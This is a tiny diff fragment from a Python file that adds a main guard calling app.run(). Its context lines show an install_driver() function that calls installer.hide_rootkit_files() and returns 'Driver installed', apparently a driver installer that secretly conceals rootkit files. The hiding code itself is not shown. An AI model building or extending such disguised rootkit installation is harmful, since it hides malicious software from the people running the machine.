@@ -99,3 +99,7 @@ def install_driver() -> str:
     installer.hide_rootkit_files()
 
     return "Driver installed"
+
+
+if __name__ == "__main__":
+    app.run()
